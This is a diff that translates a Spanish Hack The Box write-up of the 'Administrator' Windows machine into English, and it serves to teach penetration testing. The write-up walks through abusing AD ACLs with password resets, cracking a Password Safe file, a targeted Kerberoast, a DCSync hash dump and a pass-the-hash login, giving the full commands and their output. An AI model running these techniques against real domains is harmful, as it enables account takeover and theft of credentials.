@@ -1,7 +1,7 @@
 ---
 layout: single
 title: Administrator - Hack The Box
-excerpt: Este es el write-up de Administrator, una máquina Windows de dificultad media centrada en el abuso de Active Directory, donde los permisos ACL inadecuados, la reutilización de credenciales y el Kerberoasting conducen al compromiso total del dominio.
+excerpt: Write-up of Administrator, a medium-difficulty Windows machine centered on Active Directory abuse. Improper ACL permissions, credential reuse and Kerberoasting chain together into full domain compromise.
 date: 2024-11-13
 classes: wide
 header:
@@ -17,7 +17,7 @@ tags:
   - ACL
 ---
 
-Este artículo detalla los pasos seguidos para resolver la máquina **Administrator** de Hack The Box. Es un desafío puro de Active Directory. Se empieza con las credenciales de un usuario y se utilizan para recopilar datos de Bloodhound en el dominio. Se descubre que se puede modificar la contraseña de un usuario y que ese usuario puede modificar la contraseña de otro usuario. Ese usuario tiene acceso a un recurso compartido FTP donde se encuentra un archivo Password Safe. Se descifra la contraseña para recuperar más contraseñas y se pasa al siguiente usuario. Este usuario tiene GenericWrite sobre otro usuario, lo que se aprovecha con un ataque Kerberoasting dirigido. Por último, se realiza un ataque DCSync para volcar el hash del administrador del dominio y comprometer completamente el dominio.
+This article documents the steps taken to solve the **Administrator** machine from Hack The Box. It's a pure Active Directory challenge. We start with one user's credentials and use them to collect domain data with BloodHound. We discover that we can change a user's password and that user, in turn, can change another user's password. That user has access to an FTP share where a Password Safe file is stored. The password is cracked to recover more passwords and we pivot to the next user. This user has GenericWrite over another user, which is abused with a targeted Kerberoasting attack. Finally, a DCSync attack is performed to dump the domain administrator hash and fully compromise the domain.
 
 ### Tools/Blogs used
 
@@ -36,7 +36,7 @@ Este artículo detalla los pasos seguidos para resolver la máquina **Administra
 
 ## Recon
 
-El primer paso será utilizar nmap para ver los puertos abiertos de la máquina. `nmap` encuentra varios puertos TCP abiertos:
+The first step is to run nmap to enumerate the open ports on the machine. `nmap` finds several open TCP ports:
 
 ```
 └─$ nmap -sVC 10.10.11.42
@@ -74,11 +74,11 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 35.47 seconds
 ```
 
-Con los resultados del nmap podemos observar que la máquina parece ser un controlador de dominio de Windows (Kerberos, LDAP, SMB, etc.), y también tiene WinrM (5985) abierto, por lo que probablemnte podamos usar ese puerto para acceder con credenciales a la máquina.
+From the nmap output the machine looks like a Windows Domain Controller (Kerberos, LDAP, SMB, etc.), and WinRM (5985) is open as well, so credential-based access through that port is likely possible.
 
-Además el FTP está abierto, lo que no es común en un DC.
+FTP is also open, which is uncommon on a DC.
 
-También se observa en la salida del script LDAP el nombre del dominio administrator.htb. Este nombre de host del DC se añade en el archivo /etc/hosts. Se tiene que añadir la siguiente linea:
+The LDAP script output also reveals the domain name `administrator.htb`. The DC hostname is added to /etc/hosts:
 
 ```
 └─$ nano /etc/hosts
@@ -86,9 +86,9 @@ También se observa en la salida del script LDAP el nombre del dominio administr
 10.10.11.42   administrator.htb
 ```
 
-## Enumeración
+## Enumeration
 
-Viendo que tenemos credenciales válidas para el dominio, se utilizan estas credenciales para obtener una lista de usuarios válidos:
+With valid domain credentials in hand, the first step is to dump a list of valid users:
 
 ```
 └─$ netexec smb administrator.htb -u olivia -p ichliebedich --users
@@ -108,13 +108,13 @@ SMB         10.10.11.42     445    DC               emma                        
 SMB         10.10.11.42     445    DC               [*] Enumerated 10 local users: ADMINISTRATOR
 ```
 
-Se puede utilizar este comando para guardar los usuarios en un archivo
+The following command can be used to save just the usernames to a file:
 
 ```
 nxc smb 10.10.11.42 -u olivia -p "ichliebedich" --users | grep -E '^[[:space:]]*SMB[[:space:]]+[0-9.]+' | awk '{print $5}'
 ```
 
-El siguiente paso de la enumeración, es ver si con el usuario inicial tenemos lectura / escritura en alguna carpeta compartida interesante de la máquina, pero no es el caso.
+Next, check whether the initial user has read/write access to any interesting shares on the machine — which turns out not to be the case:
 
 ```
 └─$ netexec smb administrator.htb -u olivia -p ichliebedich --shares
@@ -130,7 +130,7 @@ SMB         10.10.11.42     445    DC               NETLOGON        READ        
 SMB         10.10.11.42     445    DC               SYSVOL          READ            Logon server share
 ```
 
-Recordando que la máquina tiene el puerto WinRM abierto, si el usuario esta dentro del grupo de Remote Desktop Managment Users, podremos acceder a la máquina a través de este puerto. Por lo que a continuación se comprueba si con las credenciales iniciales podemos acceder a través de este puerto.
+Since the machine has WinRM open, if the user belongs to the Remote Management Users group we should be able to log in through that port. Check it with the initial credentials:
 
 ```
 └─$ netexec winrm 10.10.11.42 -u olivia -p ichliebedich
@@ -138,7 +138,7 @@ WINRM       10.10.11.42     5985   DC               [*] Windows Server 2022 Buil
 WINRM       10.10.11.42     5985   DC               [+] administrator.htb\olivia:ichliebedich (Pwn3d!)
 ```
 
-Es posible acceder a la máquina a través del puerto de WinRM por lo que se utiliza evil-winrm para acceder.
+WinRM access works, so evil-winrm is used to drop a shell:
 
 ```
 └─$ evil-winrm -i administrator.htb -u olivia -p ichliebedich
@@ -149,7 +149,7 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\olivia\Documents>
 ```
 
-Podemos ver los privilegios de olivia y los grupos a los que pertence.
+Dump olivia's privileges and group memberships:
 
 ```
 *Evil-WinRM* PS C:\inetpub> whoami /all
@@ -193,11 +193,11 @@ User claims unknown.
 Kerberos support for Dynamic Access Control on this device has been disabled.
 ```
 
-Olivia no tiene ningún privilegio explotable, pero se confirma que esta en el grupo de Remote Management Users.
+Olivia has no exploitable privilege, but membership in `Remote Management Users` is confirmed.
 
-### Bloodhound
+### BloodHound
 
-Se ha usado el recolector **bloodhound-python** para obtener los datos del dominio y subirlos a **Bloodhound**.
+The **bloodhound-python** collector is used to pull domain data and feed it into **BloodHound**:
 
 ```
 └─$ bloodhound-python -d administrator.htb -c all -u olivia -p ichliebedich -ns 10.10.11.42 --zip
@@ -221,19 +221,19 @@ INFO: Compressing output into 20241116053818_bloodhound.zip
 
 ```
 
-Una vez obtenido el zip, se ha subido a Bloodhound. Aquí se puede observar que olivia tiene permiso GenericAll al usuario Michael, esto significa que olivia tiene control para por ejemplo cambiarle la contraseña al usuario Michael, lo que permitirá ganar acceso como ese usuario.
+Once the zip is loaded into BloodHound, olivia is shown to have `GenericAll` over the user Michael. That means olivia controls Michael's object — including resetting his password — which gives access as that user.
 
 ![](/assets/images/htb-writeup-administrator/olivia-acl.png)
 
-## Explotación (Olivia -> Michael)
+## Exploitation (Olivia → Michael)
 
-Para cambiar la contraseña se ha utilizado net rpc
+To change the password, `net rpc` is used:
 
 ```
 net rpc password "michael" "michael123" -U "administrator.htb"/"olivia"%"ichliebedich" -S 10.10.11.42
 ```
 
-Una vez cambiada podemos comprobar que las nuevas credenciales son válidas con netexec, tanto por SMB como WinRM
+Once changed, the new credentials are verified with NetExec, both over SMB and WinRM:
 
 ```
 └─$ netexec smb 10.10.11.42 -u michael -p 'michael123'
@@ -247,15 +247,15 @@ WINRM       10.10.11.42     5985   DC               [*] Windows Server 2022 Buil
 WINRM       10.10.11.42     5985   DC               [+] administrator.htb\michael:michael123 (Pwn3d!)
 ```
 
-## Movimiento Lateral (Michael -> Benjamin)
+## Lateral movement (Michael → Benjamin)
 
-Volviendo a Bloodhound y comprobando los permisos de michael, se observa que este usuario tiene permiso de ForceChangePassword sobre benjamin, lo que le permite cambiarle la contraseña. Por lo que se volverá a realizar la misma técnica que en el paso anterior.
+Back in BloodHound, michael's outbound permissions show `ForceChangePassword` over benjamin, which allows resetting his password too. The same technique is used:
 
 ```
 net rpc password "benjamin" "benjamin123" -U "administrator.htb"/"michael"%"michael123" -S 10.10.11.42
 ```
 
-Una vez cambiada podemos comprobar que las nuevas credenciales son válidas con netexec, solo por SMB.
+The new credentials are verified — they work over SMB but not WinRM:
 
 ```
 └─$ netexec smb 10.10.11.42 -u benjamin -p 'benjamin123'
@@ -269,14 +269,14 @@ WINRM       10.10.11.42     5985   DC               [*] Windows Server 2022 Buil
 WINRM       10.10.11.42     5985   DC               [-] administrator.htb\benjamin:benjamin123
 ```
 
-Enumerando con este usuario no parece tener permisos explotables ni en la máquina ni en el Directorio Activo. Recordando que teníamos el puerto 21 abierto en la máquina, usando netexec se ha comprobado si estas credenciales nos sirven para acceder.
+Enumerating with this user reveals no obvious exploitable permissions on the machine or in Active Directory. Recalling that port 21 was open, NetExec is used to check whether these credentials work over FTP:
 
 ```
 └─$ netexec ftp administrator.htb -u benjamin -p benjamin123
 FTP         10.10.11.42     21     administrator.htb [+] benjamin:benjamin123
 ```
 
-Son validas! Eso es porque Benjamin está en el grupo Share Moderates, como puedo ver desde mi shell como Olivia.
+They work — because Benjamin is in the `Share Moderators` group, as can be seen from the olivia shell:
 
 ```
 *Evil-WinRM* PS C:\Users\olivia\Documents> net user benjamin
@@ -289,9 +289,9 @@ Global Group memberships     *Domain Users
 The command completed successfully.
 ```
 
-## Movimiento Lateral (Benjamin -> user.txt)
+## Lateral movement (Benjamin → user.txt)
 
-Cuando entramos con el usuario benjamin al ftp podemos obtener el archivo Backup.psafe3.
+Logging into the FTP as benjamin yields a `Backup.psafe3` file:
 
 ```
 └─$ ftp 10.10.11.42
@@ -318,14 +318,14 @@ File may not have transferred correctly.
 952 bytes received in 00:00 (6.66 KiB/s)
 ```
 
-Podemos saber que el fichero es un Password Save V3 database usando el comando file
+The `file` command identifies it as a Password Safe V3 database:
 
 ```
 └─$ file Backup.psafe3
 Backup.psafe3: Password Safe V3 database
 ```
 
-Se observa que el fichero esta protegido por una contraseña por lo que se ha utilizado pwsafe2john y posteriormente john the ripper para romper esta contraseña.
+The file is password-protected, so `pwsafe2john` and John the Ripper are used to crack it:
 
 ```
 └─$ pwsafe2john Backup.psafe3 > pwsafedump.txt
@@ -338,11 +338,11 @@ tekieromucho  (Backu)
 ...[snip]...
 ```
 
-La contraseña es tekieromucho. Una vez obtenida la contraseña se ha descargado y instalado la última version de Password Safe desde [GitHub](https://github.com/pwsafe/pwsafe/releases?q=non-windows&expanded=true). Al ejecutarse y introducir la contraseña, se pueden observar tres usuarios:
+The password is `tekieromucho`. The latest version of Password Safe is then downloaded and installed from [GitHub](https://github.com/pwsafe/pwsafe/releases?q=non-windows&expanded=true). Opening the file with this password reveals three users:
 
 ![](/assets/images/htb-writeup-administrator/users.png)
 
-Si probamos las tres contraseñas, detectamos que la única válida es la de emily, que también nos sirve para WinRM.
+Trying the three passwords, only emily's is valid — and it also grants WinRM access:
 
 ```
 └─$ netexec smb administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
@@ -354,34 +354,34 @@ WINRM       10.10.11.42     5985   DC               [*] Windows Server 2022 Buil
 WINRM       10.10.11.42     5985   DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb (Pwn3d!)
 ```
 
-Con este usuario podemos obtener la primera flag.
+With this user, the first flag is recovered:
 
 ```
 *Evil-WinRM* PS C:\Users\emily\desktop> cat user.txt
 142aa43f************************
 ```
 
-## Escalada de Privilegios
+## Privilege escalation
 
-Volviendo a Bloodhound, si revisamos los permisos de emily, se puede observar que tiene privilegio de GenericAll contra Ethan, que es un Administrador del Dominio y puede realizar DCSync contra el dominio.
+Back in BloodHound, emily's outbound rights show `GenericAll` over Ethan — a Domain Admin with DCSync rights over the domain.
 
 ![](/assets/images/htb-writeup-administrator/emily.png)
 
-El permiso GenericAll otorga control total sobre el objeto afectado, lo que permite a emily modificar atributos críticos del usuario Ethan, incluyendo su contraseña, pertenencia a grupos o delegación de permisos.
+`GenericAll` grants full control over the target object, which lets emily modify critical attributes of the user Ethan, including his password, group membership and permission delegation.
 
-Dado que Ethan es miembro del grupo Domain Admins, comprometer esta cuenta implica un control completo sobre el dominio. Además, este nivel de privilegio permite realizar un ataque DCSync, mediante el cual es posible replicar credenciales del controlador de dominio y obtener los hashes de todas las cuentas del dominio, incluyendo krbtgt.
+Since Ethan is a member of `Domain Admins`, compromising his account means full control of the domain. On top of that, this level of privilege enables a DCSync attack — replicating credentials from the Domain Controller to obtain the hashes of every account in the domain, including `krbtgt`.
 
-En consecuencia, el privilegio GenericAll de emily sobre Ethan representa una ruta directa de escalada de privilegios hasta Domain Admin y compromiso total del dominio.
+`GenericAll` from emily to Ethan is therefore a direct path to Domain Admin and full domain compromise.
 
 ### Targeted Kerberoasting
 
-Un nombre principal de servicio (SPN) es un identificador único que asocia una instancia de servicio con una cuenta de servicio en Kerberos. El kerberoasting es un ataque en el que un usuario autenticado solicita un ticket para un servicio mediante su SPN, y el ticket que se devuelve está cifrado con la contraseña del usuario asociado a ese servicio. Si esa contraseña es débil, se puede descifrar mediante fuerza bruta sin conexión.
+A Service Principal Name (SPN) is a unique identifier that associates a service instance with a service account in Kerberos. Kerberoasting is an attack in which an authenticated user requests a ticket for a service via its SPN; the returned ticket is encrypted with the password of the account associated with that service. If that password is weak, it can be cracked offline.
 
-Para realizar un kerberoast dirigido, se utiliza el privilegio GenericWrite para dar a Ethan un SPN. A continuación, se puede solicitar un ticket para ese servicio falso y obtener un ticket cifrado con el hash de la contraseña de Ethan. Si esa contraseña es débil, se puede descifrarla sin conexión.
+For a targeted Kerberoast, the `GenericWrite` (in this case, `GenericAll`) privilege is used to add an SPN to Ethan. After that, a ticket for that fake service can be requested, returning a hash encrypted with Ethan's password. If the password is weak, it can be cracked offline.
 
-Se ha utilizado la herramienta [targetedkerberoast.py](https://github.com/ShutdownRepo/targetedKerberoast.git)
+The tool [targetedkerberoast.py](https://github.com/ShutdownRepo/targetedKerberoast.git) is used.
 
-Ahora me aseguraré de que mi reloj esté sincronizado y ejecutaré el script, que detectará los privilegios de escritura de la usuaria emily, añadirá un SPN, obtendrá el hash y luego limpiará.
+First the local clock is synced against the DC, then the script is run — it detects emily's write privilege, adds an SPN, fetches the hash, and cleans up:
 
 ```
 └─$ sudo ntpdate administrator.htb
@@ -400,7 +400,7 @@ $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$e7458cb1f13711cedb
 [VERBOSE] SPN removed successfully for (ethan)
 ```
 
-`hashcat` con `rockyou.txt` rompe el hash en unos pocos segundos.
+`hashcat` with `rockyou.txt` cracks the hash in a few seconds:
 
 ```
 └─$ hashcat ethan.hash /usr/share/wordlists/rockyou.txt
@@ -415,7 +415,7 @@ $krb5tgs$23$_ethan$ADMINISTRATOR.HTB$administrator.htb/ethan_$82e55c4be49...[sni
 ...[snip]...
 ```
 
-La contraseña del usuario ethan es "limpbizkit". Este usuario tiene privilegio de DCSync contra el dominio, por lo que podemos obtener todos los hashes usando impacket-secretsdump.
+Ethan's password is `limpbizkit`. This user has DCSync rights against the domain, so all hashes can be dumped with `impacket-secretsdump`:
 
 ```
 └─$ impacket-secretsdump 'administrator.htb'/'ethan':'limpbizkit'@'10.10.11.42'
@@ -469,7 +469,7 @@ DC$:des-cbc-md5:f483547c4325492a
 [*] Cleaning up...
 ```
 
-Con el hash de Administrador podemos acceder a la máquina y obtener la flag final.
+With the Administrator hash, evil-winrm authenticates against the DC and grabs the final flag:
 
 ```
 └─$ evil-winrm -i 10.10.11.42 -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
